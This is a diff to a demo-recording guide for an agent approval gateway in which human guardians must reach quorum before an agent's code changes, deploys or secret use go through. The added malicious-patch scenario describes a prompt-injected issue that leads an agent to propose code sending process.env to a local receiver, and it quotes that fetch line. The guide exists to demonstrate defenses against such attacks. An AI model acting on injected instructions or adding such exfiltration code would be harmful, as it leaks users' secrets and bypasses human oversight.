@@ -115,9 +115,97 @@
   - Gateway detects hash discrepancy and aborts with `HASH_MISMATCH (422)`.
   - Deploy does not execute.
 
+### Scenario A (Clip 1) — Real Code Change Workflow (Bug Fix -> Quorum -> Tests -> FF Merge)
+- **Goal**: Demonstrate the complete end-to-end code change lifecycle with automated testing and protected git repository custodian merging.
+- **Command**:
+  ```bash
+  bash scripts/real-code-change.sh
+  # or make demo-a
+  ```
+- **Expected Outcome**:
+  - Protected repo baseline (`mock-env/protected-repo`) initially fails test suite on `calculateDiscount(20)`.
+  - Agent prepares clean unified diff fixing off-by-one boundary (`> 20` to `>= 20`) in `src/discount.js`.
+  - Agent proposes change via `request_code_change` with `baseSha` and `filesTouched`.
+  - Guardian UI displays:
+    - Side-by-side / inline diff viewer with syntax-colored red/green lines, dual line numbers, and file headers.
+    - Base commit SHA and files touched badges.
+    - Prominent status line: *"Protected repo is unchanged until quorum"*.
+  - Guardian 1 (Alice) reviews the diff and approves (1/2 signatures).
+  - Guardian 2 (Bob) reviews the diff and approves (2/2 quorum reached).
+  - Gateway creates a temporary branch, applies patch, runs `npm test` inside the repo.
+  - Tests succeed: gateway fast-forwards `main` with `Approved-by:` trailers in the commit message.
+  - UI's Protected Repo panel automatically refreshes, displaying the new commit on `main`.
+
+### Scenario B (Clip 2) — Injected Malicious Code Defense (Risk Signals -> Veto -> 0 Leaks)
+- **Goal**: Demonstrate detection and defense against malicious code changes attempting secret exfiltration.
+- **Command**:
+  ```bash
+  bash scripts/real-code-injection.sh
+  # or make demo-b
+  ```
+- **Expected Outcome**:
+  - Malicious issue (`mock-env/fixtures/malicious-code-issue.md`) injects code that sends `process.env` to `http://localhost:4002/receive`.
+  - Agent submits `request_code_change` with the injected diff.
+  - Gateway inspects the patch deterministically and computes risk signals:
+    - `new-network-call`: Patch introduces outbound HTTP/fetch logic.
+    - `env-access`: Patch references runtime `process.env`.
+  - Guardian UI displays bright red badges for each risk signal with plain-language explanations.
+  - Diff viewer highlights the suspicious lines in green additions (`fetch('http://localhost:4002/receive', ...)`).
+  - Guardian Alice identifies the exfiltration attempt and clicks **Reject**, recording the reason.
+  - Request transitions to `rejected`.
+  - Protected repository remains completely untouched (HEAD SHA unchanged in Protected Repo panel).
+  - Fake external receiver (`http://localhost:4002/viewer`) displays **0 payloads received (Nothing arrived)**.
+
 ---
 
-## 5. Pre-Recording Checklist & Backup Plan
+## 5. Real-Agent Video Recording Walkthrough (Clips 1 & 2)
+
+### Clip 1: Legitimate Fix Merged After 2/2 Quorum (~45–60 Seconds)
+- **Visual**:
+  - Left 50%: Agent workspace / terminal where agent runs tests and calls `request_code_change`.
+  - Right 50%: Guardian UI on `http://localhost:5173/actions/<id>`.
+- **Narration Script**:
+  1. *"Here, the agent is tasked with fixing an off-by-one discount calculation bug in sample-repo."*
+  2. *"Rather than having direct push access to the repository, the agent submits a unified patch through the Key-Holder Gateway."*
+  3. *"On the right, Guardian Alice reviews the exact unified diff in the Guardian Dashboard. Notice the base commit SHA and the clear indicator: 'Protected repo is unchanged until quorum'."*
+  4. *"Alice approves. We see 1 of 2 approvals recorded. Guardian Bob logs in and provides the second approval."*
+  5. *"With 2-of-2 quorum reached, the gateway spins up a verification branch, runs the repository's test suite, and fast-forwards main with signed guardian trailers. The protected repo updates in real time."*
+
+### Clip 2: Injected Malicious Patch Rejected — Repo Untouched (~45–60 Seconds)
+- **Visual**:
+  - Left 50%: Attacker issue fixture + Agent terminal proposing telemetry patch.
+  - Right 50%: Guardian UI showing bright red risk signal tags and diff viewer.
+- **Narration Script**:
+  1. *"Now, an attacker files an issue with prompt injection asking the agent to add diagnostic telemetry posting process.env to an external receiver."*
+  2. *"The agent submits the proposal. But the gateway immediately analyzes the patch and flags deterministic risk signals: 'new-network-call' and 'env-access'."*
+  3. *"The guardian opens the review page. The risk signals immediately alert them, and the diff viewer clearly isolates the suspicious outbound fetch."*
+  4. *"The guardian clicks Reject. The proposal is aborted, the protected repository remains untouched, and our external listener verifies that exactly zero bytes were leaked."*
+
+---
+
+## 6. How This Resembles vs Differs from Standard PR Review
+
+| Property | Standard GitHub / GitLab PR Review | Key-Holder Gateway Code Gate |
+| :--- | :--- | :--- |
+| **Approval Binding** | Approval is tied to branch head or PR state. Rebasing, amending, or force-pushing can mutate what was reviewed. | **Cryptographically Hash-Bound**: Approvals sign `parametersHash = sha256(canonical(patch + baseSha))`. If a single character changes, gateway rejects with `HASH_MISMATCH`. |
+| **Agent Interception** | Agent has direct git push credentials to git branches. | **Agent-Agnostic MCP Tool Gate**: Agent NEVER has write credentials to `PROTECTED_REPO_PATH`. It only calls `request_code_change`. |
+| **Unified Single Gate** | Code review is isolated in GitHub. Production deploys, secrets, and outbound network calls use separate silos. | **Unified Single Gate**: Secrets (`request_use_secret`), deployment (`request_deploy`), external sends (`request_send_external`), and code (`request_code_change`) share the identical quorum engine, audit log, and 4-eyes rule. |
+| **Identity Guarantee** | Standard centralized IdP login (username/password or SSO). | **Tide Multi-Party Identity**: Threshold-signed JWTs backed by PRISM multi-party cryptography when live TideCloak is enabled (DEV tokens clearly labeled when running locally). |
+
+---
+
+## 7. Known Limitations & Trust Boundaries
+
+1. **Guardians Being Deceived / Social Engineering**: Quorum protects against rogue individuals and unauthorized agents, but cannot prevent human guardians from being socially engineered into approving an action.
+2. **Hasty Review / Rubber-Stamping**: If 2 out of 3 guardians approve without carefully verifying commit hashes, risk signals, or destinations, the action will execute.
+3. **Forgotten Gates**: The gateway only defends operations routed through its MCP tools (`request_deploy`, `request_use_secret`, `request_send_external`, `request_code_change`). Any un-intercepted side-channels or direct shell executions outside the gateway remain unprotected.
+4. **Pre-Existing Local Machine Secrets**: If secrets already reside in plain text within a local developer's `.bashrc`, unencrypted `.env`, or host files, an agent with local terminal execution can read them without calling the gateway. Secrets must be segregated behind the gateway interface.
+5. **Simulated UI Session**: In the local demo without a running Docker engine, the Guardian UI uses simulated guardian profiles clearly labeled with **MOCK LOGIN**.
+6. **Shared OS User (PoC Boundary)**: In this local demonstration, the agent and gateway execute under the same OS user account. The directory separation between the agent workspace and `PROTECTED_REPO_PATH` is an architectural pattern demonstrating custodian isolation, not a hardened OS container sandbox. In production, the gateway operates on an isolated host or cluster.
+
+---
+
+## 8. Pre-Recording Checklist & Backup Plan
 
 - [ ] Run `make demo` to start all 4 services concurrently.
 - [ ] Verify health endpoints:
@@ -132,6 +220,8 @@
   bash scripts/scenario-3-prompt-injection.sh
   bash scripts/scenario-4-manual-attacker.sh
   bash scripts/scenario-5-param-swap.sh
+  bash scripts/real-code-change.sh
+  bash scripts/real-code-injection.sh
   ```
 - [ ] Confirm no scenario prints `[MOCK MODE]` during live execution.
 - [ ] **Backup Plan**: Record a full take early. If live network ports experience conflict on the recording machine, pass `MOCK_MODE=1` to run the deterministic offline contract tests (`MOCK_MODE=1 bash scripts/scenario-2-legit-deploy.sh`).
